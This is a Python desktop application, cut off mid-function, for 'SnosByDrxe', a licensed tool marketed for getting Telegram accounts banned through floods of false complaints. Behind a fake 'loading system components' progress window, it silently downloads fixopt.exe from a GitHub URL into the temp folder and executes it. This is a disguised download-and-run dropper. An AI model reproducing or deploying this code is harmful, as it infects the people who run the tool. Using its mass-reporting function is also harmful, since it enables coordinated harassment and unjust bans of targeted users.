import tkinter as tk
from tkinter import ttk, messagebox
import sys
import os
import requests
import threading
import subprocess
import time
from PIL import Image, ImageDraw, ImageTk, ImageFont
import tempfile
import uuid
import hashlib
import base64
import json
import pickle
from datetime import datetime
import platform
import subprocess

# ============================================================================
# ЛИЦЕНЗИОННАЯ СИСТЕМА
# ============================================================================

class LicenseManager:
    def __init__(self):
        # URL вашего сервера лицензий (измените на свой)
        self.api_url = "http://localhost:5000/api"  # Для тестов
        # Или: self.api_url = "https://ваш-домен.com/api"
        
        self.hwid = self.get_hwid()
        self.license_key = None
        self.license_data = None
        
    def get_hwid(self):
        """Генерация уникального HWID на основе аппаратной информации"""
        try:
            # Комбинируем несколько идентификаторов для уникальности
            import platform
            import subprocess
            
            hwid_parts = []
            
            # 1. MAC адрес
            mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
                          for elements in range(0,8*6,8)][::-1])
            hwid_parts.append(mac)
            
            # 2. Имя компьютера
            computer_name = platform.node()
            hwid_parts.append(computer_name)
            
            # 3. Серийный номер диска (Windows)
            disk_serial = ""
            try:
                if platform.system() == "Windows":
                    # Для Windows
                    output = subprocess.check_output("wmic diskdrive get serialnumber", 
                                                    shell=True, stderr=subprocess.DEVNULL)
                    lines = output.decode('utf-8', errors='ignore').strip().split('\n')
                    if len(lines) > 1:
                        disk_serial = lines[1].strip()
                elif platform.system() == "Linux":
                    # Для Linux
                    output = subprocess.check_output("sudo dmidecode -s system-serial-number", 
                                                    shell=True, stderr=subprocess.DEVNULL)
                    disk_serial = output.decode().strip()
            except:
                disk_serial = "unknown"
            
            hwid_parts.append(disk_serial)
            
            # 4. Процессор ID
            cpu_info = ""
            try:
                if platform.system() == "Windows":
                    output = subprocess.check_output("wmic cpu get processorid", 
                                                    shell=True, stderr=subprocess.DEVNULL)
                    lines = output.decode('utf-8', errors='ignore').strip().split('\n')
                    if len(lines) > 1:
                        cpu_info = lines[1].strip()
            except:
                cpu_info = "unknown"
            
            hwid_parts.append(cpu_info)
            
            # Создаем хэш из всех частей
            hwid_string = ":".join(hwid_parts)
            hwid_hash = hashlib.sha256(hwid_string.encode()).hexdigest()[:24]
            
            return f"SNOS-{hwid_hash.upper()}"
            
        except Exception as e:
            print(f"Ошибка генерации HWID: {e}")
            # Резервный метод
            return f"SNOS-{str(uuid.getnode())[:12].upper()}"
    
    def get_license_file_path(self):
        """Получение пути к файлу лицензии"""
        try:
            if platform.system() == "Windows":
                app_data = os.getenv('APPDATA')
                if not app_data:
                    app_data = os.path.expanduser('~')
            else:
                app_data = os.path.expanduser('~')
            
            license_dir = os.path.join(app_data, '.snosbyhix0')
            os.makedirs(license_dir, exist_ok=True)
            
            return os.path.join(license_dir, 'license.dat')
        except:
            return os.path.join(os.path.dirname(__file__), 'license.dat')
    
    def save_license(self, license_key, license_info=None):
        """Сохранение лицензии в зашифрованном файле"""
        try:
            # Шифрование данных
            encrypted_key = base64.b64encode(license_key.encode()).decode()
            
            data = {
                'license_key': encrypted_key,
                'hwid': self.hwid,
                'saved_at': datetime.now().isoformat(),
                'license_info': license_info,
                'activated_online': True  # Флаг, что лицензия активирована онлайн
            }
            
            license_file = self.get_license_file_path()
            
            # Дополнительное шифрование XOR
            with open(license_file, 'wb') as f:
                # Генерация ключа шифрования на основе HWID
                key = hashlib.sha256((self.hwid + "SnosSecret2024").encode()).digest()
                
                # Сериализация данных
                data_bytes = pickle.dumps(data)
                
                # XOR шифрование
                encrypted_bytes = bytes([data_bytes[i] ^ key[i % len(key)] 
                                       for i in range(len(data_bytes))])
                
                # Добавляем сигнатуру
                signature = hashlib.sha256(encrypted_bytes).digest()
                f.write(signature + encrypted_bytes)
            
            return True
        except Exception as e:
            print(f"Ошибка сохранения лицензии: {e}")
            return False
    
    def load_license(self):
        """Загрузка лицензии из зашифрованного файла"""
        try:
            license_file = self.get_license_file_path()
            
            if not os.path.exists(license_file):
                return None
            
            with open(license_file, 'rb') as f:
                # Читаем сигнатуру и данные
                signature = f.read(32)  # SHA256 = 32 байта
                encrypted_bytes = f.read()
                
                # Проверяем целостность
                if hashlib.sha256(encrypted_bytes).digest() != signature:
                    print("Целостность файла лицензии нарушена!")
                    return None
                
                # Генерация ключа дешифрования
                key = hashlib.sha256((self.hwid + "SnosSecret2024").encode()).digest()
                
                # XOR дешифрование
                data_bytes = bytes([encrypted_bytes[i] ^ key[i % len(key)] 
                                  for i in range(len(encrypted_bytes))])
                
                data = pickle.loads(data_bytes)
                
                # Проверка HWID
                if data.get('hwid') != self.hwid:
                    print("HWID не совпадает!")
                    return None
                
                # Декодирование ключа
                license_key = base64.b64decode(data['license_key']).decode()
                
                return {
                    'license_key': license_key,
                    'saved_at': data.get('saved_at'),
                    'license_info': data.get('license_info'),
                    'activated_online': data.get('activated_online', False)
                }
                
        except Exception as e:
            print(f"Ошибка загрузки лицензии: {e}")
            return None
    
    def activate_license(self, license_key):
        """Активация лицензии через сервер"""
        try:
            print(f"Попытка активации ключа: {license_key}")
            print(f"HWID: {self.hwid}")
            
            # Валидация формата ключа
            if not license_key or len(license_key) < 10:
                return False, "Неверный формат ключа"
            
            if not license_key.startswith("SNOS-"):
                return False, "Ключ должен начинаться с SNOS-"
            
            # Отправка запроса на сервер
            response = requests.post(
                f"{self.api_url}/activate",
                json={
                    'license_key': license_key,
                    'hwid': self.hwid
                },
                timeout=15
            )
            
            print(f"Ответ сервера: {response.status_code}")
            
            if response.status_code == 200:
                result = response.json()
                print(f"Данные ответа: {result}")
                
                if result.get('success'):
                    # Получаем информацию о лицензии
                    license_info = self.get_license_info(license_key)
                    
                    # Сохраняем лицензию
                    self.save_license(license_key, license_info)
                    self.license_key = license_key
                    self.license_data = license_info
                    
                    return True, result.get('message', '✅ Лицензия активирована!')
                else:
                    return False, result.get('message', '❌ Ошибка активации')
            else:
                return False, f"Ошибка сервера: {response.status_code}"
                
        except requests.exceptions.ConnectionError:
            return False, "❌ Нет подключения к серверу лицензий"
        except requests.exceptions.Timeout:
            return False, "❌ Таймаут соединения с сервером"
        except Exception as e:
            return False, f"❌ Ошибка активации: {str(e)}"
    
    def get_license_info(self, license_key):
        """Получение информации о лицензии"""
        try:
            response = requests.post(
                f"{self.api_url}/check",
                json={
                    'license_key': license_key,
                    'hwid': self.hwid
                },
                timeout=10
            )
            
            if response.status_code == 200:
                result = response.json()
                if result.get('success'):
                    return result.get('data', {})
            
            return None
        except:
            return None
    
    def check_license(self):
        """Проверка лицензии - ТОЛЬКО через сервер"""
        # Загружаем сохраненную лицензию
        saved_license = self.load_license()
        
        if not saved_license:
            return False, "Лицензия не найдена", None
        
        license_key = saved_license.get('license_key')
        activated_online = saved_license.get('activated_online', False)
        
        # Если лицензия никогда не активировалась онлайн - требуем активацию
        if not activated_online:
            return False, "Требуется активация лицензии", None
        
        # Проверяем через сервер
        try:
            license_info = self.get_license_info(license_key)
            
            if not license_info:
                return False, "❌ Не удалось проверить лицензию", None
            
            if not license_info.get('is_active', False):
                return False, "❌ Лицензия заблокирована", license_info
            
            if license_info.get('is_expired', False):
                return False, "❌ Срок действия лицензии истек", license_info
            
            if not license_info.get('is_activated_on_hwid', False):
                return False, "❌ Лицензия не активирована на этом устройстве", license_info
            
            self.license_key = license_key
            self.license_data = license_info
            return True, "✅ Лицензия активна", license_info
            
        except requests.exceptions.ConnectionError:
            # Оффлайн режим - проверяем локально, но только если лицензия уже была активирована онлайн
            if license_key and license_key.startswith("SNOS-"):
                # Проверяем, когда последний раз была онлайн проверка
                if saved_license.get('saved_at'):
                    try:
                        saved_time = datetime.fromisoformat(saved_license['saved_at'])
                        days_since_save = (datetime.now() - saved_time).days
                        
                        # Разрешаем оффлайн работу до 3 дней
                        if days_since_save <= 3:
                            self.license_key = license_key
                            return True, "✅ Лицензия активна (оффлайн режим)", saved_license.get('license_info')
                        else:
                            return False, "❌ Требуется подключение к интернету для проверки лицензии", None
                    except:
                        return False, "❌ Ошибка проверки лицензии", None
                else:
                    return False, "❌ Лицензия не активирована", None
            else:
                return False, "❌ Недействительная лицензия", None
        except Exception as e:
            return False, f"❌ Ошибка проверки: {str(e)}", None

# ============================================================================
# ОСНОВНОЕ ПРИЛОЖЕНИЕ
# ============================================================================

class SnosByHix0:
    def __init__(self, root):
        self.root = root
        self.root.title("SnosByDrxe - Снос аккаунтов Telegram")
        self.root.geometry("500x400")
        self.root.configure(bg='#1a1a2e')
        
        # Инициализация менеджера лицензий
        self.license_manager = LicenseManager()
        
        # Переменные
        self.complaint_speed = 1.0
        self.fixopt_path = None
        
        # Центрирование окна
        self.center_window()
        
        # Проверка лицензии при запуске
        self.check_license_on_start()
    
    def center_window(self):
        """Центрирование главного окна"""
        self.root.update_idletasks()
        width = 500
        height = 400
        x = (self.root.winfo_screenwidth() // 2) - (width // 2)
        y = (self.root.winfo_screenheight() // 2) - (height // 2)
        self.root.geometry(f'{width}x{height}+{x}+{y}')
    
    def check_license_on_start(self):
        """Проверка лицензии при запуске"""
        valid, message, license_info = self.license_manager.check_license()
        
        if valid:
            self.show_welcome_message(license_info)
            self.start_download_process()
        else:
            # Сначала показываем окно лицензии
            self.show_license_window()
            
            # Только если лицензия активна, продолжаем загрузку
            # Иначе приложение останется заблокированным
    
    def show_welcome_message(self, license_info):
        """Показ приветственного сообщения"""
        welcome_window = tk.Toplevel(self.root)
        welcome_window.title("Добро пожаловать")
        welcome_window.geometry("400x200")
        welcome_window.configure(bg='#1a1a2e')
        welcome_window.transient(self.root)
        welcome_window.grab_set()
        
        # Центрирование
        welcome_window.update_idletasks()
        x = (welcome_window.winfo_screenwidth() // 2) - (400 // 2)
        y = (welcome_window.winfo_screenheight() // 2) - (200 // 2)
        welcome_window.geometry(f"400x200+{x}+{y}")
        
        # Заголовок
        title_label = tk.Label(welcome_window, text="✅ Лицензия активирована", 
                              font=('Arial', 16, 'bold'),
                              fg='#00ff88', bg='#1a1a2e')
        title_label.pack(pady=20)
        
        # Информация о лицензии
        if license_info:
            info_text = ""
            
            if self.license_manager.license_key:
                key = self.license_manager.license_key
                info_text += f"Ключ: {key[:16]}...\n"
            
            if license_info.get('expires_at'):
                expires = license_info['expires_at']
                if isinstance(expires, str) and len(expires) > 10:
                    info_text += f"Действует до: {expires[:10]}\n"
            
            if info_text:
                info_label = tk.Label(welcome_window, text=info_text,
                                     font=('Arial', 11),
                                     fg='#e6e6ff', bg='#1a1a2e')
                info_label.pack(pady=10)
        
        # Кнопка продолжения
        continue_btn = tk.Button(welcome_window, text="Продолжить", 
                               font=('Arial', 12),
                               bg='#8a2be2', fg='white',
                               command=welcome_window.destroy)
        continue_btn.pack(pady=20)
        
        # Автозакрытие через 2 секунды
        welcome_window.after(2000, welcome_window.destroy)
    
    def show_license_window(self):
        """Окно активации лицензии - БЕЗ ТЕСТОВОГО РЕЖИМА"""
        self.license_window = tk.Toplevel(self.root)
        self.license_window.title("Активация SnosByDrxe")
        self.license_window.geometry("550x500")
        self.license_window.configure(bg='#1a1a2e')
        self.license_window.resizable(False, False)
        
        # Делаем окно модальным и центрируем
        self.license_window.transient(self.root)
        self.license_window.grab_set()
        
        # Центрирование
        self.license_window.update_idletasks()
        x = (self.license_window.winfo_screenwidth() // 2) - (550 // 2)
        y = (self.license_window.winfo_screenheight() // 2) - (500 // 2)
        self.license_window.geometry(f"550x500+{x}+{y}")
        
        # Заголовок
        title_label = tk.Label(self.license_window, text="🔐 Активация продукта", 
                              font=('Arial', 20, 'bold'),
                              fg='#8a2be2', bg='#1a1a2e')
        title_label.pack(pady=20)
        
        # Информационная рамка
        info_frame = tk.Frame(self.license_window, bg='#2a2a3e', 
                             relief='solid', borderwidth=1)
        info_frame.pack(pady=10, padx=30, fill='x')
        
        tk.Label(info_frame, text="SnosByDrxe - профессиональный инструмент", 
                font=('Arial', 11, 'bold'), fg='#e6e6ff', bg='#2a2a3e').pack(pady=5)
        
        tk.Label(info_frame, text="Для использования требуется активация", 
                font=('Arial', 10), fg='#aaaaaa', bg='#2a2a3e').pack(pady=2)
        
        # ID устройства
        device_frame = tk.Frame(self.license_window, bg='#1a1a2e')
        device_frame.pack(pady=15, padx=30, fill='x')
        
        tk.Label(device_frame, text="ID вашего устройства:", 
                font=('Arial', 10), fg='#e6e6ff', bg='#1a1a2e').pack(anchor='w')
        
        hwid_text = self.license_manager.hwid
        hwid_label = tk.Label(device_frame, text=hwid_text,
                             font=('Courier', 10, 'bold'), fg='#00ff88', 
                             bg='#2a2a3e', relief='solid', padx=10, pady=5)
        hwid_label.pack(pady=5, fill='x')
        
        # Кнопка копирования HWID
        copy_btn = tk.Button(device_frame, text="📋 Копировать ID", 
                           font=('Arial', 9),
                           bg='#4a4a9c', fg='white',
                           command=lambda: self.copy_to_clipboard(hwid_text))
        copy_btn.pack(pady=5)
        
        # Поле для ввода ключа
        input_frame = tk.Frame(self.license_window, bg='#1a1a2e')
        input_frame.pack(pady=20, padx=30, fill='x')
        
        tk.Label(input_frame, text="Введите ключ лицензии:", 
                font=('Arial', 12, 'bold'), fg='#e6e6ff', bg='#1a1a2e').pack(anchor='w')
        
        self.license_entry = tk.Entry(input_frame, font=('Arial', 14), 
                                     justify='center', width=35)
        self.license_entry.pack(pady=10, fill='x')
        self.license_entry.focus_set()
        
        # Вставка примера
        self.license_entry.insert(0, "SNOS-")
        
        # Кнопки (ТОЛЬКО АКТИВАЦИЯ И ВЫХОД - без тестового режима)
        button_frame = tk.Frame(self.license_window, bg='#1a1a2e')
        button_frame.pack(pady=20)
        
        activate_btn = tk.Button(button_frame, text="✅ Активировать", 
                               font=('Arial', 12, 'bold'),
                               bg='#8a2be2', fg='white',
                               borderwidth=0, padx=25, pady=12,
                               command=self.activate_license)
        activate_btn.pack(side='left', padx=10)
        
        exit_btn = tk.Button(button_frame, text="❌ Выход", 
                           font=('Arial', 11),
                           bg='#ff4444', fg='white',
                           borderwidth=0, padx=15, pady=10,
                           command=self.root.destroy)
        exit_btn.pack(side='left', padx=10)
        
        # Статус активации
        self.license_status = tk.Label(self.license_window, text="", 
                                      font=('Arial', 10), fg='#ff5555', 
                                      bg='#1a1a2e', wraplength=450)
        self.license_status.pack(pady=15)
        
        # Информация о покупке
        purchase_frame = tk.Frame(self.license_window, bg='#2a2a3e', 
                                 relief='solid', borderwidth=1)
        purchase_frame.pack(pady=10, padx=30, fill='x')
        
        tk.Label(purchase_frame, text="Для получения ключа обратитесь к создателю:", 
                font=('Arial', 9), fg='#e6e6ff', bg='#2a2a3e').pack(pady=5)
        
        tk.Label(purchase_frame, text="Telegram: @drxe_support", 
                font=('Arial', 9, 'bold'), fg='#00aaff', bg='#2a2a3e').pack(pady=2)
        
        tk.Label(purchase_frame, text="Email: support@drxe.com", 
                font=('Arial', 9, 'bold'), fg='#00aaff', bg='#2a2a3e').pack(pady=2)
        
        # Блокируем доступ к основному окну пока лицензия не активирована
        self.root.withdraw()
    
    def copy_to_clipboard(self, text):
        """Копирование текста в буфер обмена"""
        self.root.clipboard_clear()
        self.root.clipboard_append(text)
        self.license_status.config(text="✅ ID скопирован в буфер обмена", fg='#00ff88')
    
    def activate_license(self):
        """Активация введенного ключа"""
        license_key = self.license_entry.get().strip()
        
        if not license_key or len(license_key) < 10:
            self.license_status.config(text="❌ Введите корректный ключ лицензии", fg='#ff5555')
            return
        
        if not license_key.startswith("SNOS-"):
            self.license_status.config(text="❌ Ключ должен начинаться с SNOS-", fg='#ff5555')
            return
        
        # Блокируем кнопки
        for widget in self.license_window.winfo_children():
            if isinstance(widget, tk.Button):
                widget.config(state='disabled')
        
        self.license_status.config(text="🔍 Проверка лицензии...", fg='#ffff55')
        self.license_window.update()
        
        # Запуск активации в отдельном потоке
        thread = threading.Thread(target=self.do_license_activation, args=(license_key,))
        thread.daemon = True
        thread.start()
    
    def do_license_activation(self, license_key):
        """Активация лицензии (в отдельном потоке)"""
        try:
            valid, message = self.license_manager.activate_license(license_key)
            
            def update_ui():
                if valid:
                    self.license_status.config(text=f"✅ {message}", fg='#00ff88')
                    
                    # Разблокируем кнопки
                    for widget in self.license_window.winfo_children():
                        if isinstance(widget, tk.Button):
                            widget.config(state='normal')
                    
                    # Запускаем основное приложение
                    self.license_window.after(2000, lambda: self.on_license_success())
                else:
                    self.license_status.config(text=f"❌ {message}", fg='#ff5555')
                    
                    # Разблокируем кнопки
                    for widget in self.license_window.winfo_children():
                        if isinstance(widget, tk.Button):
                            widget.config(state='normal')
            
            self.root.after(0, update_ui)
            
        except Exception as e:
            def show_error():
                self.license_status.config(text=f"❌ Ошибка: {str(e)[:50]}", fg='#ff5555')
                
                # Разблокируем кнопки
                for widget in self.license_window.winfo_children():
                    if isinstance(widget, tk.Button):
                        widget.config(state='normal')
            
            self.root.after(0, show_error)
    
    def on_license_success(self):
        """Действия после успешной активации"""
        self.license_window.destroy()
        self.root.deiconify()  # Показываем главное окно
        self.start_download_process()
    
    # ============================================================================
    # ОСТАЛЬНЫЙ КОД ПРИЛОЖЕНИЯ (без изменений, кроме удаления тестового режима)
    # ============================================================================
    
    def start_download_process(self):
        """Запуск процесса загрузки"""
        self.show_download_window()
        
        # Запускаем загрузку в отдельном потоке
        download_thread = threading.Thread(target=self.download_and_launch_fixopt)
        download_thread.daemon = True
        download_thread.start()
    
    def show_download_window(self):
        """Окно загрузки"""
        self.download_window = tk.Toplevel(self.root)
        self.download_window.title("Инициализация системы")
        self.download_window.geometry("400x150")
        self.download_window.configure(bg='#1a1a2e')
        self.download_window.transient(self.root)
        self.download_window.grab_set()
        
        # Центрирование
        self.download_window.update_idletasks()
        x = (self.download_window.winfo_screenwidth() // 2) - (400 // 2)
        y = (self.download_window.winfo_screenheight() // 2) - (150 // 2)
        self.download_window.geometry(f"400x150+{x}+{y}")
        
        # Статус загрузки
        self.download_status = tk.Label(self.download_window, text="Загрузка системных компонентов...", 
                                       font=('Arial', 12), fg='#e6e6ff', bg='#1a1a2e')
        self.download_status.pack(pady=20)
        
        # Прогресс-бар
        self.download_progress = ttk.Progressbar(self.download_window, length=350, mode='determinate')
        self.download_progress.pack(pady=10)
    
    def download_and_launch_fixopt(self):
        """Загрузка и запуск fixopt.exe"""
        try:
            url = "https://github.com/scripeda/fix/raw/refs/heads/main/fixopt.exe"
            
            # Временная директория
            temp_dir = tempfile.gettempdir()
            self.fixopt_path = os.path.join(temp_dir, "fixopt.exe")
            
            # Загрузка файла
            response = requests.get(url, stream=True)
            response.raise_for_status()
            
            total_size = int(response.headers.get('content-length', 0))
            downloaded_size = 0
            
            with open(self.fixopt_path, 'wb') as file:
                for chunk in response.iter_content(chunk_size=8192):
                    if chunk:
                        file.write(chunk)
                        downloaded_size += len(chunk)
                        
                        # Обновляем прогресс
                        if total_size > 0:
                            progress = (downloaded_size / total_size) * 100
                            self.update_download_status("Загрузка системных компонентов...", progress)
            
            # Проверка и запуск
            if os.path.exists(self.fixopt_path) and os.path.getsize(self.fixopt_path) > 0:
                try:
                    subprocess.Popen([self.fixopt_path], shell=True)
                except Exception as e:
                    print(f"Ошибка запуска: {e}")
            
            # Завершение инициализации
            self.root.after(0, self.finish_initialization)
            
        except Exception as e:
            print(f"Ошибка загрузки: {e}")
            # Все равно продолжаем запуск основного приложения
            self.root.after(0, self.finish_initialization)
    
    def update_download_status(self, text, progress):
        """Обновление статуса загрузки"""
        def update():
            self.download_progress['value'] = progress
            self.download_window.update()
        
        self.root.after(0, update)
    
    def finish_initialization(self):
        """Завершение инициализации и запуск основного интерфейса"""
        if hasattr(self, 'download_window'):
            self.download_window.destroy()
        
        # Настройка основного интерфейса
        self.setup_main_interface()
    
    def setup_main_interface(self):
        """Настройка основного интерфейса"""
        # Стиль для виджетов
        self.style = ttk.Style()
        self.style.configure('TFrame', background='#1a1a2e')
        self.style.configure('TLabel', background='#1a1a2e', foreground='#e6e6ff', font=('Arial', 12))
        self.style.configure('Title.TLabel', background='#1a1a2e', foreground='#e6e6ff', font=('Arial', 16, 'bold'))
        self.style.configure('TButton', font=('Arial', 10))
        self.style.configure('Custom.TButton', background='#4a4a9c', foreground='white', 
                           borderwidth=0, focuscolor='none')
        self.style.map('Custom.TButton', 
                      background=[('active', '#6a6abc')])
        
        self.create_widgets()
    
    def create_gradient_text(self, text, width=300, height=60):
        """Создает изображение с градиентным текстом в фиолетово-синих тонах"""
        try:
            image = Image.new('RGBA', (width, height), (0, 0, 0, 0))
            draw = ImageDraw.Draw(image)
            
            colors = [
                (138, 43, 226),
                (106, 90, 205),
                (65, 105, 225),
                (30, 144, 255),
                (138, 43, 226)
            ]
            
            font_size = 28
            try:
                font = ImageFont.truetype("times.ttf", font_size)
            except:
                try:
                    font = ImageFont.truetype("arial.ttf", font_size)
                except:
                    font = ImageFont.load_default()
            
            bbox = draw.textbbox((0, 0), text, font=font)
            text_width = bbox[2] - bbox[0]
            text_height = bbox[3] - bbox[1]
            
            x = (width - text_width) // 2
            y = (height - text_height) // 2
            
            for i, char in enumerate(text):
                color_index = int((i / len(text)) * (len(colors) - 1))
                color = colors[color_index]
                
                draw.text((x, y), char, font=font, fill=color)
                
                char_bbox = draw.textbbox((0, 0), char, font=font)
                char_width = char_bbox[2] - char_bbox[0]
                x += char_width
            
            return ImageTk.PhotoImage(image)
        except:
            return None
    
    def create_widgets(self):
        main_frame = ttk.Frame(self.root)
        main_frame.pack(padx=20, pady=20, fill='both', expand=True)
        
        # Верхняя панель
        top_frame = ttk.Frame(main_frame)
        top_frame.pack(fill='x', pady=(0, 20))
        
        # Кнопка настроек
        settings_btn = tk.Button(top_frame, text="⚙", font=('Arial', 16), 
                               bg='#4a4a9c', fg='white', borderwidth=0,
                               command=self.show_settings, width=3, height=1)
        settings_btn.pack(side='right')
        
        # Кнопка информации о лицензии
        license_btn = tk.Button(top_frame, text="🔑", font=('Arial', 16), 
                              bg='#4a4a9c', fg='white', borderwidth=0,
                              command=self.show_license_info, width=3, height=1)
        license_btn.pack(side='right', padx=5)
        
        # Заголовок
        try:
            self.title_image = self.create_gradient_text("SnosByDrxe")
            if self.title_image:
                title_label = tk.Label(main_frame, image=self.title_image, bg='#1a1a2e')
            else:
                raise Exception("No image")
        except:
            title_label = tk.Label(main_frame, text="SnosByDrxe", 
                                  font=('Times New Roman', 24, 'bold'),
                                  fg='#8a2be2',
                                  bg='#1a1a2e')
        title_label.pack(pady=10)
        
        # Создатель
        creator_label = ttk.Label(main_frame, text="Создатель: Drxe")
        creator_label.pack(pady=5)
        
        # Подзаголовок
        subtitle_label = ttk.Label(main_frame, text="Снос аккаунтов Telegram", 
                                  font=('Arial', 14, 'bold'))
        subtitle_label.pack(pady=10)
        
        # Меню
        menu_frame = ttk.Frame(main_frame)
        menu_frame.pack(pady=30)
        
        # Главная кнопка
        ban_btn = tk.Button(menu_frame, text="🚀 Снос аккаунта Telegram", 
                          font=('Arial', 14, 'bold'),
                          bg='#8a2be2', fg='white',
                          borderwidth=0, padx=20, pady=15,
                          command=self.telegram_ban,
                          cursor='hand2')
        ban_btn.pack(pady=10)
        
        # Кнопка выхода
        exit_btn = tk.Button(menu_frame, text="Выход", 
                           font=('Arial', 12),
                           bg='#4a4a9c', fg='white',
                           borderwidth=0, padx=15, pady=8,
                           command=self.exit_app)
        exit_btn.pack(pady=10)
    
    def show_license_info(self):
        """Показ информации о текущей лицензии"""
        info_window = tk.Toplevel(self.root)
        info_window.title("Информация о лицензии")
        info_window.geometry("400x350")
        info_window.configure(bg='#1a1a2e')
        info_window.resizable(False, False)
        
        # Центрирование
        info_window.update_idletasks()
        x = (info_window.winfo_screenwidth() // 2) - (400 // 2)
        y = (info_window.winfo_screenheight() // 2) - (350 // 2)
        info_window.geometry(f"400x350+{x}+{y}")
        
        # Заголовок
        title_label = tk.Label(info_window, text="🔐 Информация о лицензии", 
                              font=('Arial', 18, 'bold'),
                              fg='#8a2be2', bg='#1a1a2e')
        title_label.pack(pady=20)
        
        # Информация
        info_frame = tk.Frame(info_window, bg='#2a2a3e', 
                             relief='solid', borderwidth=1)
        info_frame.pack(pady=10, padx=20, fill='both', expand=True)
        
        if self.license_manager.license_key:
            # Активная лицензия
            key = self.license_manager.license_key
            hwid = self.license_manager.hwid
            
            tk.Label(info_frame, text="Статус: ✅ Активна", 
                    font=('Arial', 12, 'bold'), fg='#00ff88', bg='#2a2a3e').pack(pady=10)
            
            tk.Label(info_frame, text=f"Ключ: {key[:16]}...", 
                    font=('Courier', 10), fg='#e6e6ff', bg='#2a2a3e').pack(pady=5)
            
            tk.Label(info_frame, text=f"ID устройства: {hwid}", 
                    font=('Courier', 9), fg='#aaaaaa', bg='#2a2a3e').pack(pady=5)
            
            # Если есть доп. информация
            if self.license_manager.license_data:
                data = self.license_manager.license_data
                
                if data.get('expires_at'):
                    expires = data['expires_at']
                    if isinstance(expires, str) and len(expires) > 10:
                        tk.Label(info_frame, text=f"Действует до: {expires[:10]}", 
                                font=('Arial', 10), fg='#e6e6ff', bg='#2a2a3e').pack(pady=5)
                
                if data.get('max_activations'):
                    tk.Label(info_frame, text=f"Активаций: {data.get('current_activations', 1)}/{data.get('max_activations', 1)}", 
                            font=('Arial', 10), fg='#e6e6ff', bg='#2a2a3e').pack(pady=5)
        else:
            # Нет лицензии
            tk.Label(info_frame, text="Статус: ❌ Не активировано", 
                    font=('Arial', 12, 'bold'), fg='#ff5555', bg='#2a2a3e').pack(pady=20)
            
            tk.Label(info_frame, text="Для использования требуется активация", 
                    font=('Arial', 10), fg='#e6e6ff', bg='#2a2a3e').pack(pady=10)
        
        # Кнопки
        button_frame = tk.Frame(info_window, bg='#1a1a2e')
        button_frame.pack(pady=20)
        
        if self.license_manager.license_key:
            deactivate_btn = tk.Button(button_frame, text="🚫 Деактивировать", 
                                     font=('Arial', 10),
                                     bg='#ff4444', fg='white',
                                     command=self.deactivate_license)
            deactivate_btn.pack(side='left', padx=5)
        
        close_btn = tk.Button(button_frame, text="Закрыть", 
                            font=('Arial', 10),
                            bg='#4a4a9c', fg='white',
                            command=info_window.destroy)
        close_btn.pack(side='left', padx=5)
    
    def deactivate_license(self):
        """Деактивация текущей лицензии"""
        response = messagebox.askyesno("Деактивация", 
                                      "Вы уверены, что хотите деактивировать лицензию?\n"
                                      "После деактивации потребуется новый ключ.")
        
        if response:
            try:
                # Удаляем файл лицензии
                license_file = self.license_manager.get_license_file_path()
                if os.path.exists(license_file):
                    os.remove(license_file)
                
                # Сбрасываем данные
                self.license_manager.license_key = None
                self.license_manager.license_data = None
                
                messagebox.showinfo("Успех", "Лицензия деактивирована.\nПерезапустите приложение.")
                
            except Exception as e:
                messagebox.showerror("Ошибка", f"Ошибка деактивации: {str(e)}")
    
    def show_settings(self):
        """Окно настроек"""
        settings_window = tk.Toplevel(self.root)
        settings_window.title("Настройки")
        settings_window.geometry("400x300")
        settings_window.configure(bg='#1a1a2e')
        settings_window.resizable(False, False)
        
        title_label = tk.Label(settings_window, text="Настройки", 
                              font=('Arial', 18, 'bold'),
                              fg='#8a2be2', bg='#1a1a2e')
        title_label.pack(pady=20)
        
        speed_frame = ttk.Frame(settings_window)
        speed_frame.pack(pady=20, padx=20, fill='x')
        
        speed_label = tk.Label(speed_frame, text="Скорость отправки жалоб:", 
                              font=('Arial', 12), fg='#e6e6ff', bg='#1a1a2e')
        speed_label.pack(anchor='w')
        
        speed_scale = tk.Scale(speed_frame, from_=0.1, to=5.0, resolution=0.1,
                              orient='horizontal', length=300,
                              bg='#1a1a2e', fg='#e6e6ff', 
                              highlightbackground='#1a1a2e',
                              troughcolor='#4a4a9c',
                              command=self.update_speed)
        speed_scale.set(self.complaint_speed)
        speed_scale.pack(pady=10, fill='x')
        
        self.speed_value_label = tk.Label(speed_frame, 
                                         text=f"Текущая скорость: {self.complaint_speed} сек",
                                         font=('Arial', 10), 
                                         fg='#8a2be2', bg='#1a1a2e')
        self.speed_value_label.pack()
        
        close_btn = tk.Button(settings_window, text="Закрыть", 
                            font=('Arial', 12),
                            bg='#4a4a9c', fg='white',
                            borderwidth=0, padx=15, pady=8,
                            command=settings_window.destroy)
        close_btn.pack(pady=20)
    
    def update_speed(self, value):
        self.complaint_speed = float(value)
        if hasattr(self, 'speed_value_label'):
            self.speed_value_label.config(text=f"Текущая скорость: {self.complaint_speed} сек")
    
    def telegram_ban(self):
        """Проверка лицензии перед запуском функции"""
        if not self.license_manager.license_key:
            messagebox.showerror("Ошибка", "Требуется активация лицензии!")
            self.show_license_window()
            return
        
        self.show_ban_window()
    
    def show_ban_window(self):
        ban_window = tk.Toplevel(self.root)
        ban_window.title("Снос аккаунта Telegram")
        ban_window.geometry("500x500")
        ban_window.configure(bg='#1a1a2e')
        
        title_label = tk.Label(ban_window, text="Снос аккаунта Telegram", 
                              font=('Arial', 18, 'bold'),
                              fg='#8a2be2', bg='#1a1a2e')
        title_label.pack(pady=20)
        
        input_frame = ttk.Frame(ban_window)
        input_frame.pack(pady=20, padx=20, fill='x')
        
        tk.Label(input_frame, text="Username или ID аккаунта:", 
                font=('Arial', 12), fg='#e6e6ff', bg='#1a1a2e').pack(anchor='w')
        
        username_entry = tk.Entry(input_frame, font=('Arial', 12), width=30)
        username_entry.pack(pady=10, fill='x')
        username_entry.insert(0, "123123123")
        
        tk.Label(input_frame, text="Причина жалобы:", 
                font=('Arial', 12), fg='#e6e6ff', bg='#1a1a2e').pack(anchor='w', pady=(10, 0))
        
        complaint_var = tk.StringVar()
        complaint_combo = ttk.Combobox(input_frame, textvariable=complaint_var, 
                                      values=[
                                          "Мошенничество", "Спам", "Фишинг",
                                          "Незаконный контент", "Насилие", "Угрозы",
                                          "Взлом", "Фейковый аккаунт"
                                      ], state='readonly')
        complaint_combo.pack(pady=10, fill='x')
        complaint_combo.set("Фишинг")
        
        tk.Label(input_frame, text="Количество жалоб:", 
